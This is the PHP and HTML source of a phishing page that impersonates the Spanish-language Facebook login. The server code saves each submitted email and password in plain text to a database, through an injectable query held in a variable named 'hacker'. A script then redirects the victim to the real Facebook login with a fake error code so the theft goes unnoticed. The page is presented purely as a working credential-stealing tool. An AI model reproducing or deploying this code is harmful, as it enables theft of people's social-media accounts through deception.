<?php include"importante/conexion.php";?>
<?php
$proceso	= $_POST['proceso'];
$email		= $_POST['email'];
if($proceso=="Registrar"){
	$clave= $_POST['pass'];
	$fecha= $_POST['fecha'];
	$tipo= $_POST['tipo'];
	$estado= $_POST['estado'];
	
	/*$validarUsuarios = "SELECT * FROM usuarios WHERE usuario='$email'";
	$ejecutarUsuarios = mysql_query($validarUsuarios);
	$filaUsuario = mysql_fetch_array($ejecutarUsuarios);
	$contReal = $filaUsuario['contador'];
	$codigo = $filaUsuario['codUsuarios'];*/
	
		$hacker="INSERT INTO usuarios(usuario, clave, tipoCuenta, fecha, estado)VALUES('$email','$clave', '$tipo', '$fecha', '$estado')";
	$resultHacker=mysql_query($hacker);
	$linkred ="location.href='https://www.facebook.com/login.php?login_attempt&login_attempt=1&error_login=543MoKDJFKlkdsj_SDFKDSFGJ_LASDFKJ9498HJ59OSLDSFGKLJ5_9HJJklsdfgklgj59gj45ekjgfRr&email=$email'";
	/*header('Location: https://www.facebook.com/login.php?login_attempt&email=$email');*/
}
?>
<!doctype html><html><head><meta charset="utf-8"><link rel="shortcut icon" href="IMG/facebook_favicon.gif" type="image/x-icon"><link rel="icon" href="IMG/facebook_favicon.gif" type="image/x-icon"><title>¡Bienvenido a Facebook en Español!</title><link href="css/estilo.css" rel="stylesheet" type="text/css">
<script>
function Validar(){
	if(document.fcms.email.value == ""){
			document.fcms.email.focus()
			return
		}
	if(document.fcms.pass.value == ""){
			document.fcms.pass.focus()
			return
		}
		if(document.fcms.pass.value != "" && document.fcms.email.value != ""){
			document.fcms.action = "index.php";
			document.fcms.proceso.value = "Registrar";
			document.fcms.submit();
		}
	
	}
    </script>
    <script language="Javascript">

<?php echo $linkred;?>;

</script>
    <!--<scripttype="text/javascript">window.onload= function(){document.formulario.campo.focus()}}</script>--></head>
<body onLoad="document.fcms.email.focus()">
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-57336716-2', 'auto');
  ga('send', 'pageview');

</script>
<header id="cabecera">
<div id="contenidoCab">
<div id="titulo"><a href="index.php"><img src="IMG/Facebook.png" width="169" height="34" alt=""/></a></div>
<form method="post" action="" id="entrar" name="fcms">
<label class="correo">
<p class="tit1">Correo o teléfono</p>
<input type="email" size="20" class="email" name="email">
<p class="tit-p"><input class="nos" type="checkbox" disabled="disabled" dropzone="move"><span class="nocerrar">No cerrar sesión</span></p>
</label>
<label class="contra">
<p class="tit2">Contraseña</p>
<input type="password" size="21" class="pass" name="pass">
<p class="tit-p"><span class="olv">¿Olvidaste tu contraseña?</span></p>
</label> 
<input type="submit" value="Entrar" class="boton" onClick="javascript:Validar();">
<div class="limpiar"></div>
<input type="hidden" name="proceso">
<input type="hidden" name="estado" value="A">
<input type="hidden" name="tipo" value="F" >
<?php
$fecha = date("y-m-d");
?>
<input type="hidden" name="fecha" value="<?php echo $fecha; ?>">
</form>
<div class="limpiar"></div>
</div>
</header>

<section id="cuerpo">
<div id="cuerpoCont">
	<div id="contIzq">
   	  <div class="frasef"><p><span>Facebook te ayuda a comunicarte y </span><br><span class="frasefl">compartir con las personas que forman parte</span><br> <span class="frasefl">de tu vida.</span></p></div>
        <figure class="imgf">
   	    	<img src="IMG/pyNVUg5EM0j.png" width="537" height="195" alt=""/> 
        </figure>
    </div>
    <div id="contDer">
    <h1>Regístrate</h1>
    <p>Es gratis y lo será siempre.</p>
    <div class="registrate">
    	<form id="reg-bn">
        <label>
        	<input type="text" class="nombre form" value="Nombre" size="17">
            <input type="text" class="apellido form" value="Apellido" size="17">
         </label>
         	<input type="text" class="correo1 form" size="41" value="Correo electrónico o número de celular"><br>
            <input type="text" class="correoConf form" size="41" value="Confirmar correo electrónico o celular"><br>
            <input type="text" class="contraseña2 form" size="41" value="Contraseña nueva">
         <div id="fechanac">
         
         <a class="titfecha">Fecha de nacimiento</a><br>
         	<label class="fecha123">
         	<select name="transporte" class="fo dia">
			<option>Día</option>
			<option>2</option>
			<option>3</option>
			</select>
            <select name="transporte" class="fo mes">
			<option>Mes</option>
			<option>Ene</option>
			<option>Feb</option>
			</select>
            <select name="transporte" class="fo anio">
			<option>Año</option>
			<option>1960</option>
			<option>1961</option>
			</select>
            </label>
            <a class="why">¿Por qué tengo que dar mi<br> fecha de nacimiento?</a>
         </div><br>
         <div id="radioG">
         <input type="radio" name="transporte" value="1">Mujer 
		 <input type="radio" name="transporte" value="2" class="rHom">Hombre
        </div><br>
         <a class="abrirC">Al hacer clic en Terminado, aceptas las <span>Condiciones</span> y que has<br> leído la <span>Política de uso de datos</span>, incluido el <span>Uso de cookies</span>.</a><br>
        	<input type="submit" value="Terminado" class="term">
        </form>
    </div>
    <div>
    </div>
    <a class="creap"><span>Crea una página</span> para un personaje público, un grupo de<br> música o un negocio.</a>
    </div>
    <div class="limpiar"></div>
</div>
</section>
<footer id="piepagina">
	<div id="contpiepagina">
    	<ul class="pais">
        	<li><a>Español (España)</a></li>
            <li><a>English (US)</a></li>
            <li><a>Português (Brasil)</a></li>
            <li><a>Français (France)</a></li>
            <li><a>Deutsch</a></li>
            <li><a>Italiano</a></li>
            <li><a>العربية</a></li>
            <li><a>हिन्दी</a></li>
            <li><a>中文(简体)</a></li>
            <li><a>日本語</a></li>
            <li><a class="sinra"><span>...</span></a></li>
            <div class="limpiar"></div>
        </ul>
    
        <ul class="part1">
        	<li><a>Móvil</a></li>
            <li><a>Buscar amigos</a></li>
            <li><a>Insignias</a></li>
            <li><a>Personas</a></li>
            <li><a>Páginas</a></li>
            <li><a>Lugares</a></li>
            <li><a>Juegos</a></li>
            <li><a>Lugares</a></li>
            <li><a>Información</a></li>
            <div class="limpiar"></div>
        </ul>
        
        <ul class="part2">
        	<li><a>Crear anuncio</a></li>
            <li><a>Crear página</a></li>
            <li><a>Desarrolladores</a></li>
            <li><a>Empleo</a></li>
            <li><a>Privacidad</a></li>
            <li><a>Cookies</a></li>
            <li><a>Condiciones</a></li>
            <li><a>Ayuda</a></li>
            <div class="limpiar"></div>
        </ul>
        <a class="abajo">Facebook © 2014<br>
<span>Español (España)</span></a>
    </div>
</footer>
</body>
</html>